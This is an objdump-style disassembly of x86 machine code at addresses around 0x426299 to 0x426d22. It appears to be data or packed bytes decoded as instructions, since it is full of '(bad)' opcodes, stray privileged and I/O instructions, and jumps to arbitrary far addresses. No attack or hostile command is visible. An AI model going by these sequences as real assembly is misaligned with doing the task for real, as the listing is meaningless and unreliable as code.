  426299:	dec    ecx
  42629a:	not    BYTE PTR [eax+0x12]
  42629d:	mov    bh,0x27
  42629f:	outs   dx,DWORD PTR ds:[esi]
  4262a0:	(bad)  
  4262a1:	loop   0x42625a
  4262a3:	fdiv   st,st(3)
  4262a5:	or     BYTE PTR [edi],al
  4262a7:	pop    esi
  4262a8:	push   ebp
  4262a9:	cs add DWORD PTR gs:[ecx+0xa],edx
  4262ae:	jle    0x426287
  4262b0:	or     cl,0x2d
  4262b3:	cmp    al,0x8c
  4262b5:	pushf  
  4262b6:	ss cmp eax,0x2c4f5650
  4262bc:	and    BYTE PTR [eax-0x2abdf38],al
  4262c2:	aam    0xc7
  4262c4:	leave  
  4262c5:	arpl   di,cx
  4262c7:	sahf   
  4262c8:	jo     0x426250
  4262ca:	call   0x5d9dd2ad
  4262cf:	fisub  DWORD PTR [ebx]
  4262d1:	mov    edx,0xc5285934
  4262d6:	mov    WORD PTR [edi],cs
  4262d8:	sub    bl,BYTE PTR ds:0xb69d72f8
  4262de:	jae    0x426329
  4262e0:	sub    eax,0x3b863efe
  4262e5:	mov    dl,BYTE PTR cs:[eax]
  4262e8:	arpl   WORD PTR [esi+ebx*8],cx
  4262eb:	inc    ecx
  4262ec:	lods   eax,DWORD PTR ds:[esi]
  4262ed:	retf   
  4262ee:	je     0x426351
  4262f0:	mov    DWORD PTR [eax+0x15],edi
  4262f3:	das    
  4262f4:	xabort 0x95
  4262f7:	xchg   BYTE PTR [edi+0x19],bh
  4262fa:	mov    BYTE PTR ds:0xf5a269d2,ah
  426300:	test   BYTE PTR [esi],0xd0
  426303:	mov    ecx,0x53e4de6e
  426308:	cmp    cl,BYTE PTR [ebp-0x50]
  42630b:	daa    
  42630c:	xor    BYTE PTR [ebp+0x326e4ce1],0xc7
  426313:	xchg   edi,esi
  426315:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  426317:	push   es
  426318:	inc    eax
  426319:	repnz cmp BYTE PTR [edi-0x10a772cf],al
  426320:	mov    bh,0x57
  426322:	loope  0x42633f
  426324:	inc    ebp
  426325:	call   FWORD PTR [eax]
  426327:	pop    es
  426328:	xchg   ebx,eax
  426329:	retf   0xae3f
  42632c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42632d:	inc    edi
  42632e:	in     al,dx
  42632f:	not    BYTE PTR [eax+0x58]
  426332:	popf   
  426333:	pop    edx
  426334:	fdiv   DWORD PTR [ebp+0x27d6bf95]
  42633a:	cdq    
  42633b:	inc    ebx
  42633c:	jno    0x426345
  42633e:	cmp    BYTE PTR [edi+esi*4],dh
  426341:	es cdq 
  426343:	adc    al,0x63
  426345:	mov    DWORD PTR [edx-0x21],esi
  426348:	cmp    dh,dl
  42634a:	test   al,0xb7
  42634c:	popf   
  42634d:	cmp    eax,0xacada4f6
  426352:	or     ah,cl
  426354:	mov    ds:0x83c2956b,al
  426359:	sbb    BYTE PTR [ecx+0x2c403819],ah
  42635f:	fs daa 
  426361:	ins    BYTE PTR es:[edi],dx
  426362:	add    bh,ch
  426364:	test   dh,ah
  426366:	icebp  
  426367:	test   BYTE PTR [ebx+edi*1+0x773c12ae],cl
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x16eedb50
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	cs ret 0xf17a
  4263f2:	xor    dl,BYTE PTR [esi-0x1fbc9195]
  4263f8:	fs pusha 
  4263fa:	adc    eax,0x9a84004e
  4263ff:	pop    edx
  426400:	dec    eax
  426401:	loop   0x4263e1
  426403:	(bad)  
  426404:	dec    eax
  426405:	xchg   esi,eax
  426406:	rcr    al,0xb6
  426409:	ficom  DWORD PTR [edx+ebp*4-0x33031349]
  426410:	push   0xffffff96
  426412:	cli    
  426413:	fadd   st,st(2)
  426415:	rcr    BYTE PTR [ecx],0x6e
  426418:	add    ecx,esp
  42641a:	sbb    BYTE PTR [edi+0x4cdac9ed],dh
  426420:	xor    ch,BYTE PTR [edx+ecx*4+0x41]
  426424:	iret   
  426425:	hlt    
  426426:	(bad)  
  426427:	adc    DWORD PTR [ebp+0x31],ebx
  42642a:	fmul   st(5),st
  42642c:	mov    ah,0x3e
  42642e:	mov    al,ds:0xc3ca6815
  426433:	sub    BYTE PTR [edx+0x6fcec57a],al
  426439:	rcl    DWORD PTR [ebp+edx*1-0x6f],cl
  42643d:	mov    ah,0x2f
  42643f:	cmp    BYTE PTR [edi],dl
  426441:	or     ebx,DWORD PTR [edi+eax*8+0x32]
  426445:	push   esi
  426446:	cli    
  426447:	shl    DWORD PTR [ecx],0xa1
  42644a:	je     0x426401
  42644c:	ret    
  42644d:	mov    esi,0x96de1236
  426452:	push   ecx
  426453:	pop    ebx
  426454:	mov    eax,ds:0xbaa2f440
  426459:	or     bh,dh
  42645b:	inc    ebp
  42645c:	div    cl
  42645e:	popf   
  42645f:	adc    ebx,ebp
  426461:	test   al,0xe7
  426463:	lea    esi,[edx]
  426465:	add    DWORD PTR [eax+0x42],ebx
  426468:	dec    si
  42646a:	or     DWORD PTR ds:0xd6ebcf75,ebp
  426470:	pop    ebx
  426471:	aad    0x8a
  426473:	aaa    
  426474:	inc    ebx
  426475:	iret   
  426476:	push   edx
  426477:	test   al,0xad
  426479:	call   0xee31:0x254d36ac
  426480:	loopne 0x426469
  426482:	inc    esi
  426483:	xor    WORD PTR [edx-0x54e308e4],ax
  42648a:	(bad)  
  42648b:	jle    0x426421
  42648d:	ds pushf 
  42648f:	jge    0x42649d
  426491:	push   ebp
  426492:	jmp    0x3616:0x46c607aa
  426499:	jecxz  0x42647b
  42649b:	cmp    BYTE PTR [esi-0x7e4e7f54],ah
  4264a1:	jge    0x42650b
  4264a3:	xchg   ebp,eax
  4264a4:	mov    edi,0x71cb9c2f
  4264a9:	add    edx,ecx
  4264ab:	push   edi
  4264ac:	repnz lock cmp BYTE PTR [ebx],0x36
  4264b1:	dec    edx
  4264b2:	mov    al,ds:0x4262b259
  4264b7:	xor    ch,ah
  4264b9:	inc    ebx
  4264ba:	shl    dh,0xd3
  4264bd:	or     al,0xaf
  4264bf:	je     0x426514
  4264c1:	stos   DWORD PTR es:[edi],eax
  4264c2:	ja     0x426447
  4264c4:	push   esp
  4264c5:	ins    BYTE PTR es:[edi],dx
  4264c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264c7:	add    eax,0xdfa00bd2
  4264cc:	xor    eax,0xffffffd8
  4264cf:	sbb    cl,al
  4264d1:	jmp    0x5bb4:0x10b40514
  4264d8:	xchg   ebp,eax
  4264d9:	pop    es
  4264da:	hlt    
  4264db:	stc    
  4264dc:	jecxz  0x426517
  4264de:	pop    ss
  4264df:	adc    dl,ah
  4264e1:	retf   0xb326
  4264e4:	pop    edi
  4264e5:	mov    ds:0xc103accb,eax
  4264ea:	mov    dh,0xae
  4264ec:	outs   dx,DWORD PTR ds:[esi]
  4264ed:	jmp    0x4264f2
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx-0x61118c7b]
  426565:	shl    BYTE PTR [edi-0x65],cl
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	pop    eax
  42656f:	je     0x426550
  426571:	add    BYTE PTR [edx],al
  426573:	and    ebp,DWORD PTR [eax]
  426575:	repnz mov al,ds:0x47c64079
  42657b:	sub    eax,0x67757f0a
  426580:	adc    al,0x91
  426582:	lods   eax,DWORD PTR ds:[esi]
  426583:	lods   eax,DWORD PTR ds:[esi]
  426584:	mov    bl,dh
  426586:	loopne 0x426600
  426588:	pop    ss
  426589:	(bad)  
  42658a:	(bad)  
  42658b:	adc    DWORD PTR [edi+0x3f9f9162],esi
  426591:	dec    ebx
  426592:	out    0x4f,al
  426594:	test   eax,0xb1e4e9ea
  426599:	cmp    al,0x8f
  42659b:	or     eax,0x29edf569
  4265a0:	adc    eax,0xd73ba086
  4265a5:	outs   dx,BYTE PTR ds:[esi]
  4265a6:	neg    BYTE PTR [esi]
  4265a8:	mov    esp,0x6353ac61
  4265ad:	pop    ss
  4265ae:	or     BYTE PTR [edi-0x6b5e555],cl
  4265b4:	sub    eax,0x74059957
  4265b9:	jbe    0x4265d7
  4265bb:	sbb    al,0x5d
  4265bd:	xchg   ebx,eax
  4265be:	sub    al,0x5a
  4265c0:	xchg   esi,eax
  4265c1:	inc    esi
  4265c2:	stc    
  4265c3:	jp     0x4265a3
  4265c5:	std    
  4265c6:	pop    eax
  4265c7:	popa   
  4265c8:	mov    al,BYTE PTR [edi]
  4265ca:	and    edi,edx
  4265cc:	push   ds
  4265cd:	and    al,0x90
  4265cf:	lods   al,BYTE PTR ds:[esi]
  4265d0:	or     al,0x84
  4265d2:	cs mov ah,0xe8
  4265d5:	(bad)  
  4265d6:	cld    
  4265d7:	pop    ecx
  4265d8:	and    edi,edi
  4265da:	je     0x426577
  4265dc:	ss es retf 
  4265df:	add    al,0x34
  4265e1:	xor    bl,BYTE PTR [ecx+0x4b9980ca]
  4265e7:	imul   ecx,DWORD PTR [ebx],0xe
  4265ea:	cmp    al,0xfd
  4265ec:	xchg   esi,eax
  4265ed:	int    0x2f
  4265ef:	std    
  4265f0:	std    
  4265f1:	push   edi
  4265f2:	ffreep st(4)
  4265f4:	adc    BYTE PTR [eax-0x4ebe1974],dh
  4265fa:	pop    es
  4265fb:	in     eax,dx
  4265fc:	cmp    esp,DWORD PTR [ecx-0x19]
  4265ff:	je     0x4265b1
  426601:	sti    
  426602:	enter  0x4eb5,0xbb
  426606:	push   esp
  426607:	cmc    
  426608:	mov    ebx,0x372277bc
  42660d:	unpckhps xmm3,XMMWORD PTR [edx+0x6d]
  426611:	nop
  426612:	aaa    
  426613:	mov    ch,0xe0
  426615:	mov    ch,dl
  426617:	cmp    al,0x72
  426619:	pop    eax
  42661a:	mov    al,0x5f
  42661c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661d:	or     DWORD PTR [edi+0x571edc61],esp
  426623:	ins    BYTE PTR es:[edi],dx
  426624:	ins    DWORD PTR es:[edi],dx
  426625:	(bad)  
  426626:	(bad)  
  426627:	aas    
  426628:	inc    ebx
  426629:	ror    BYTE PTR ds:[ecx-0x74889b05],cl
  426630:	fsubr  QWORD PTR [edx-0x2e]
  426633:	les    ebx,FWORD PTR [edi+0x506bb266]
  426639:	(bad)  
  42663a:	jecxz  0x4266b2
  42663c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42663d:	in     al,0x98
  42663f:	push   cs
  426640:	mov    bl,0x1f
  426642:	stos   BYTE PTR es:[edi],al
  426643:	xchg   ebp,eax
  426644:	push   ecx
  426645:	or     dl,bl
  426647:	add    DWORD PTR [ebp+0x44],eax
  42664a:	iret   
  42664b:	retf   
  42664c:	dec    esi
  42664d:	gs pop ss
  42664f:	jecxz  0x426688
  426651:	shl    ah,0x73
  426654:	test   BYTE PTR ds:0x4c80748c,al
  42665a:	lds    eax,FWORD PTR [edi+0x1fbce14e]
  426660:	pop    edx
  426661:	jae    0x4266d0
  426663:	out    0xa9,eax
  426665:	iret   
  426666:	sub    dh,BYTE PTR [ebp+0x2b7d879c]
  42666c:	inc    ebp
  42666d:	dec    edx
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x2c876da4]
  4266e4:	cmp    al,0x90
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	push   ecx
  4266ef:	pop    ds
  4266f0:	jae    0x42676b
  4266f2:	imul   ebx,DWORD PTR [edi+0x32206ddc],0x45
  4266f9:	out    dx,al
  4266fa:	ret    0x4f74
  4266fd:	mov    fs,WORD PTR [esi+eiz*8+0x4e]
  426701:	jmp    0x1c7ee34
  426706:	test   BYTE PTR [ebp-0x361c18b8],0x67
  42670d:	ret    0x5892
  426710:	jns    0x42678f
  426712:	dec    ecx
  426713:	shl    BYTE PTR [eax-0x7b5947c5],0xb9
  42671a:	clc    
  42671b:	push   esp
  42671c:	enter  0xfe28,0x2a
  426720:	rcl    dh,cl
  426722:	repz push cs
  426724:	xchg   ebx,eax
  426725:	bnd jge 0x42674e
  426728:	out    dx,eax
  426729:	or     ecx,DWORD PTR [edx+0x6e865bd5]
  42672f:	push   ecx
  426730:	and    BYTE PTR [esi+0x71],ah
  426733:	xchg   BYTE PTR [eax+0x79a8842e],al
  426739:	test   eax,0x3d3a931d
  42673e:	shl    al,1
  426740:	add    eax,0x66b069be
  426745:	mov    cl,0x6
  426747:	push   ds
  426748:	jbe    0x42671c
  42674a:	xor    ah,BYTE PTR [esi+0x39]
  42674d:	in     eax,0x69
  42674f:	aam    0x26
  426751:	cmp    eax,0x463c7606
  426756:	pop    ecx
  426757:	(bad)  
  426758:	pusha  
  426759:	hlt    
  42675a:	and    eax,0x7e61cf4a
  42675f:	fadd   st(1),st
  426761:	cmp    DWORD PTR [eax-0x63699313],edx
  426767:	and    BYTE PTR [eax+eax*4],0x6d
  42676b:	(bad)  
  42676c:	pop    eax
  42676d:	or     DWORD PTR [edx-0x35],0x3db603aa
  426774:	shl    BYTE PTR [ecx-0x6f],0x83
  426778:	adc    ah,dh
  42677a:	push   0x2fdcf8a1
  42677f:	xor    esi,edx
  426781:	mov    edx,esi
  426783:	mov    ah,0xaf
  426785:	pop    ebp
  426786:	cwde   
  426787:	ficomp WORD PTR [ecx+0x22]
  42678a:	adc    DWORD PTR [edi+0x5370ea58],edi
  426790:	cld    
  426791:	and    BYTE PTR [edx],bl
  426793:	dec    edi
  426794:	mov    esp,?
  426796:	pop    ebx
  426797:	xchg   BYTE PTR [ebx],ch
  426799:	mov    eax,DWORD PTR [edi-0x5adaa4c0]
  42679f:	popf   
  4267a0:	jae    0x42679e
  4267a2:	out    dx,eax
  4267a3:	mov    edx,0xda98597d
  4267a8:	inc    ebp
  4267a9:	mov    ax,ds:0x236d85a3
  4267af:	dec    DWORD PTR [eax]
  4267b1:	xor    edx,eax
  4267b3:	mov    al,ds:0xa9dce4a4
  4267b8:	clc    
  4267b9:	mov    eax,0x96f2038b
  4267be:	sbb    dh,BYTE PTR [esi]
  4267c0:	add    al,BYTE PTR [edi+0x6453894f]
  4267c6:	pop    edi
  4267c7:	adc    esp,edi
  4267c9:	(bad)  [esi+0x9]
  4267cc:	dec    edx
  4267cd:	test   eax,ebp
  4267cf:	lods   eax,DWORD PTR ds:[esi]
  4267d0:	and    esi,ebp
  4267d2:	dec    esp
  4267d3:	xchg   ebp,eax
  4267d4:	mov    ds:0x5e11d83,al
  4267d9:	adc    BYTE PTR [ebp-0x794844ce],ah
  4267df:	jmp    0x42683a
  4267e1:	scas   eax,DWORD PTR es:[edi]
  4267e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267e3:	dec    esi
  4267e4:	outs   dx,BYTE PTR ds:[esi]
  4267e5:	jne    0x42676a
  4267e7:	jbe    0x42677a
  4267e9:	cmp    edi,edi
  4267eb:	test   al,0x3f
  4267ed:	cdq    
	...
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	push   eax
  426863:	scas   eax,DWORD PTR es:[edi]
  426864:	mov    ds:0x19d678f,al
  426869:	add    BYTE PTR [eax],al
  42686b:	add    DWORD PTR [eax],eax
  42686d:	add    BYTE PTR [ebx-0x5c85589],dl
  426873:	jecxz  0x42683a
  426875:	out    0x4a,eax
  426877:	mov    edi,0x16a1a7e4
  42687c:	sbb    cl,BYTE PTR [eax+0x1b]
  42687f:	imul   edx,edx,0xffffffd1
  426882:	sub    BYTE PTR [ebp+0x64c4ca5],dh
  426888:	jmp    0x583385b9
  42688d:	dec    edi
  42688e:	pop    ss
  42688f:	push   eax
  426890:	xlat   BYTE PTR ds:[ebx]
  426891:	ret    
  426892:	in     al,dx
  426893:	call   0x4ec8aaf3
  426898:	mov    esp,0x3cd2e674
  42689d:	(bad)
  4268a0:	adc    al,0x90
  4268a2:	and    bh,BYTE PTR [ecx-0x32]
  4268a5:	sti    
  4268a6:	test   BYTE PTR [esi+ebx*8],0x66
  4268aa:	mul    BYTE PTR [edi+0x7d]
  4268ad:	in     al,dx
  4268ae:	(bad)  
  4268af:	lods   al,BYTE PTR ds:[esi]
  4268b0:	jmp    0x3121cb17
  4268b5:	sub    BYTE PTR [ebx],bh
  4268b7:	dec    edi
  4268b8:	mov    dh,0xe6
  4268ba:	pop    esp
  4268bb:	push   edx
  4268bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268bd:	xor    al,0x49
  4268bf:	ins    BYTE PTR es:[edi],dx
  4268c0:	je     0x4268d7
  4268c2:	inc    ecx
  4268c3:	push   0x73bd864
  4268c8:	push   esi
  4268c9:	pusha  
  4268ca:	push   esp
  4268cb:	dec    edi
  4268cc:	sar    esp,cl
  4268ce:	pop    ebx
  4268cf:	sbb    al,0xb9
  4268d1:	or     al,0x5a
  4268d3:	ins    BYTE PTR es:[edi],dx
  4268d4:	loop   0x426859
  4268d6:	inc    ebx
  4268d7:	mov    BYTE PTR [eax],ch
  4268d9:	dec    esp
  4268da:	aad    0x63
  4268dc:	bound  esp,QWORD PTR [edx+esi*2]
  4268df:	pop    edx
  4268e0:	mov    edi,0x8cea1909
  4268e5:	stc    
  4268e6:	xchg   BYTE PTR [ebp+0x65],bh
  4268e9:	sub    BYTE PTR [esi+0x33],0xd4
  4268ed:	sbb    DWORD PTR [ebx],ecx
  4268ef:	mov    ds:0xa817f1dc,eax
  4268f4:	jle    0x4268c1
  4268f6:	mov    BYTE PTR [ebx+ecx*2],0x45
  4268fa:	mov    ecx,0xa20a5066
  4268ff:	mov    esi,0xf96dfb0d
  426904:	mov    edx,0x9d3a1044
  426909:	sbb    al,0xac
  42690b:	add    BYTE PTR ds:0x5ce7ea59,dl
  426911:	dec    eax
  426912:	call   0x21e7:0x7af6e04a
  426919:	sub    eax,0x834bffcc
  42691e:	xchg   ebx,eax
  42691f:	inc    eax
  426920:	test   DWORD PTR [bx+si+0x13b0],esp
  426925:	jecxz  0x4268ad
  426927:	mov    al,ds:0x75852e7e
  42692c:	jle    0x4268c8
  42692e:	push   cs
  42692f:	jo     0x42698e
  426931:	mov    ecx,0x50ae746c
  426936:	call   0x12bf3909
  42693b:	sti    
  42693c:	stos   DWORD PTR es:[edi],eax
  42693d:	ror    DWORD PTR [ecx+0x48],1
  426940:	pushf  
  426941:	ror    eax,0x61
  426944:	fisubr WORD PTR [eax-0x3d]
  426947:	lea    ecx,[edi-0x1a]
  42694a:	push   ebx
  42694b:	ss xchg ebp,eax
  42694d:	icebp  
  42694e:	test   eax,0xcb60af30
  426953:	pop    edx
  426954:	mov    cl,0xe3
  426956:	xor    BYTE PTR [edx-0x43],ch
  426959:	adc    BYTE PTR [edi],ch
  42695b:	retf   
  42695c:	push   ss
  42695d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42695e:	ss pop ds
  426960:	in     eax,dx
  426961:	ret    
  426962:	and    ah,ah
  426964:	pop    ss
  426965:	adc    bl,al
  426967:	or     esp,ebp
  426969:	and    al,0x2
  42696b:	fxtract 
  42696d:	arpl   WORD PTR [eax],ax
	...
  4269d3:	add    BYTE PTR [eax],al
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    edx,DWORD PTR [esp+edi*2-0x61980bc4]
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	push   0xffffffa1
  4269f0:	scas   al,BYTE PTR es:[edi]
  4269f1:	sbb    BYTE PTR [eax],ah
  4269f3:	cmp    al,0xb7
  4269f5:	jge    0x426a06
  4269f7:	retf   
  4269f8:	addr16 in al,dx
  4269fa:	pop    ecx
  4269fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269fc:	cmp    ebx,DWORD PTR [edx-0x43]
  4269ff:	adc    eax,0xedaf1df2
  426a04:	imul   ebp,DWORD PTR [ebx],0x9382fbb9
  426a0a:	popf   
  426a0b:	bound  esp,QWORD PTR [esi]
  426a0d:	loopne 0x426a63
  426a0f:	adc    eax,edx
  426a11:	fdivr  st(5),st
  426a13:	ret    
  426a14:	clc    
  426a15:	jnp    0x426a95
  426a17:	cmp    eax,0xc8232e7a
  426a1c:	cmp    eax,0xc594b478
  426a21:	sbb    eax,0x6fbb373b
  426a26:	xor    DWORD PTR [eax-0x727c477c],0xd07ef220
  426a30:	push   ds
  426a31:	loopne 0x4269e5
  426a33:	scas   al,BYTE PTR es:[edi]
  426a34:	test   DWORD PTR [ebx-0x24],esp
  426a37:	in     eax,dx
  426a38:	mov    bl,0x7b
  426a3a:	fbstp  TBYTE PTR [ebp+0x39f00cc1]
  426a40:	retf   
  426a41:	es add al,0x3a
  426a44:	loop   0x426a82
  426a46:	fsubr  QWORD PTR [ebp-0x2071ce93]
  426a4c:	in     eax,dx
  426a4d:	cmp    edi,esi
  426a4f:	lock adc ecx,DWORD PTR [ebp-0x19c98fc1]
  426a56:	xor    DWORD PTR [ebx+0x7241ad11],ecx
  426a5c:	shl    DWORD PTR [edi+ebp*2],1
  426a5f:	mov    ds:0x514e9657,al
  426a64:	int    0xb
  426a66:	hlt    
  426a67:	sub    edx,edi
  426a69:	daa    
  426a6a:	mov    ds:0x5d7b18d8,eax
  426a6f:	or     eax,0x9751eb5d
  426a74:	xlat   BYTE PTR ds:[ebx]
  426a75:	je     0x426ac4
  426a77:	bnd jle 0x426a6a
  426a7a:	sbb    eax,ebx
  426a7c:	jmp    0x426a84
  426a7e:	idiv   BYTE PTR [esi+0x22]
  426a81:	dec    ebp
  426a82:	mov    BYTE PTR [edx],bh
  426a84:	sbb    edi,ecx
  426a86:	popa   
  426a87:	repnz pop edx
  426a89:	jbe    0x426a2a
  426a8b:	popa   
  426a8c:	xor    ebx,ebp
  426a8e:	pop    edi
  426a8f:	mov    BYTE PTR [ecx],0xb5
  426a92:	xchg   ebp,eax
  426a93:	neg    BYTE PTR [ebx+ebx*4+0x46]
  426a97:	daa    
  426a98:	jo     0x426ab6
  426a9a:	shr    DWORD PTR [ebx-0x6a6087e4],0x81
  426aa1:	fbld   TBYTE PTR [eax+0x14]
  426aa4:	xchg   ebx,eax
  426aa5:	sbb    eax,0x15bab86e
  426aaa:	daa    
  426aab:	mul    BYTE PTR [eax-0x77]
  426aae:	add    eax,0xc0508836
  426ab3:	ss aad 0x78
  426ab6:	sbb    al,0xbf
  426ab8:	out    dx,al
  426ab9:	(bad)  
  426aba:	aas    
  426abb:	sub    edx,DWORD PTR [edi]
  426abd:	and    BYTE PTR [ebp+0x7f],0x73
  426ac1:	aas    
  426ac2:	xlat   BYTE PTR ds:[ebx]
  426ac3:	mov    bh,BYTE PTR [esi-0x17f1c737]
  426ac9:	out    dx,eax
  426aca:	jae    0x426aa0
  426acc:	fstp   QWORD PTR [edi]
  426ace:	mov    ebp,0xd3eb7d26
  426ad3:	rcr    DWORD PTR ds:0x96e66e5a,1
  426ad9:	mul    ah
  426adb:	pushf  
  426adc:	jbe    0x426b43
  426ade:	or     ecx,DWORD PTR [ebp+0x5]
  426ae1:	mov    ds:0x814a7fc0,eax
  426ae6:	xchg   edi,eax
  426ae7:	les    edx,FWORD PTR [ebx]
  426ae9:	cmp    al,0xc7
  426aeb:	mov    esp,0x8fec
	...
  426b54:	add    BYTE PTR [eax],al
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x25
  426b63:	xchg   ebx,eax
  426b64:	inc    esi
  426b65:	fldenv [edi-0x61]
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	pop    esi
  426b6f:	ins    DWORD PTR es:[edi],dx
  426b70:	dec    eax
  426b71:	out    dx,al
  426b72:	sub    eax,0x42c7e313
  426b77:	mov    ecx,0x1a4f9e41
  426b7c:	mov    ah,0x99
  426b7e:	dec    edx
  426b7f:	aas    
  426b80:	int    0x37
  426b82:	or     bl,BYTE PTR [edx]
  426b84:	jg     0x426b3a
  426b86:	nop
  426b87:	ret    
  426b88:	mov    bh,0x7b
  426b8a:	pop    edx
  426b8b:	(bad)  
  426b8c:	into   
  426b8d:	popf   
  426b8e:	enter  0xb880,0x5b
  426b92:	pop    esi
  426b93:	xor    BYTE PTR [esi-0x50],ah
  426b96:	jp     0x426b7c
  426b98:	dec    ebp
  426b99:	push   es
  426b9a:	mov    ecx,DWORD PTR [ebp-0x64]
  426b9d:	mov    esp,DWORD PTR ds:0x971ee8cf
  426ba3:	adc    DWORD PTR [ecx+esi*2-0x6d4bd848],0x2a568db3
  426bae:	div    DWORD PTR [ecx]
  426bb0:	into   
  426bb1:	pushf  
  426bb2:	sub    DWORD PTR [ecx],esi
  426bb4:	rcl    BYTE PTR [ebp+0x168d037a],1
  426bba:	bound  ebx,QWORD PTR [ebp-0x7e692537]
  426bc0:	idiv   eax
  426bc2:	or     al,BYTE PTR [ebx+0x14]
  426bc5:	sbb    DWORD PTR [ebp-0x58eb3760],esi
  426bcb:	cmp    dh,BYTE PTR [edi]
  426bcd:	cmp    al,BYTE PTR [ebx+0xab01cb1]
  426bd3:	popf   
  426bd4:	xor    al,0xcf
  426bd6:	repnz mov al,0x63
  426bd9:	mov    BYTE PTR gs:[esi],dl
  426bdc:	cwde   
  426bdd:	repnz push 0xffffffa8
  426be0:	ins    DWORD PTR es:[edi],dx
  426be1:	mov    WORD PTR [edx+0x46594c38],gs
  426be7:	ret    
  426be8:	lahf   
  426be9:	rcr    DWORD PTR [ebp-0x5c],0x65
  426bed:	in     al,0xfb
  426bef:	(bad)  
  426bf1:	jge    0x426c2f
  426bf3:	mov    BYTE PTR [ecx],dl
  426bf5:	out    0x36,al
  426bf7:	mov    al,0x6d
  426bf9:	fs in  eax,0xd8
  426bfc:	pause  
  426bfe:	addr16 nop
  426c00:	pinsrw mm4,ebp,0x68
  426c04:	mov    ebx,0x98fa38b3
  426c09:	iret   
  426c0a:	cmp    cl,al
  426c0c:	sbb    BYTE PTR [esi],bl
  426c0e:	out    0x4,eax
  426c10:	xchg   DWORD PTR [ebp+0x2e],eax
  426c13:	fst    QWORD PTR [esi+0x5fe8d7d7]
  426c19:	xchg   esp,eax
  426c1a:	leave  
  426c1b:	push   edx
  426c1c:	shl    DWORD PTR [edi],1
  426c1e:	mov    ecx,0xfe70cabb
  426c23:	std    
  426c24:	inc    edx
  426c25:	and    DWORD PTR [esi+0x6b],ebx
  426c28:	xlat   BYTE PTR ds:[ebx]
  426c29:	lea    esi,[eax-0x3e10f8cb]
  426c2f:	jno    0x426bb5
  426c31:	pusha  
  426c32:	repz les esp,FWORD PTR [edi-0x7413d1a2]
  426c39:	enter  0x4c96,0x8b
  426c3d:	or     DWORD PTR ds:0x8d62f6c1,ebx
  426c43:	xor    DWORD PTR [edi+0x59739fec],esp
  426c49:	dec    ebp
  426c4a:	xlat   BYTE PTR ds:[ebx]
  426c4b:	and    al,bl
  426c4d:	jl     0x426c27
  426c4f:	push   0x70
  426c51:	push   edx
  426c52:	xchg   dl,bh
  426c54:	xor    ch,ch
  426c56:	mov    bh,0xf1
  426c58:	ja     0x426c4d
  426c5a:	sti    
  426c5b:	gs in  eax,0x8a
  426c5e:	mov    eax,0x2711c6ca
  426c63:	icebp  
  426c64:	inc    eax
  426c65:	jl     0x426bfe
  426c67:	(bad)  
  426c68:	cmp    cl,bl
  426c6a:	(bad)  
  426c6b:	(bad)  
  426c6c:	out    dx,al
  426c6d:	inc    eax
	...
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xd0d71691
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	mov    edi,0x51a22cbb
  426cf3:	sub    esi,DWORD PTR [edi+0x15]
  426cf6:	add    ecx,DWORD PTR [eax]
  426cf8:	mov    esp,0xdaf48831
  426cfd:	arpl   WORD PTR [ebp-0xf],si
  426d00:	hlt    
  426d01:	pop    ss
  426d02:	adc    edi,DWORD PTR [ecx+0x3354e2f1]
  426d08:	pop    ebx
  426d09:	mov    dl,0xb4
  426d0b:	pop    ds
  426d0c:	jl     0x426d18
  426d0e:	arpl   WORD PTR [eax+0x211725c3],bx
  426d14:	cmp    ch,dh
  426d16:	xlat   BYTE PTR ds:[ebx]
  426d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d18:	jl     0x426cd3
  426d1a:	lods   eax,DWORD PTR ds:[esi]
  426d1b:	add    ecx,ebp
  426d1d:	fidiv  DWORD PTR [edx]
  426d1f:	pop    ebx
  426d20:	(bad)  
  426d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d22:	xchg   DWORD PTR [ecx-0x2b],ebp
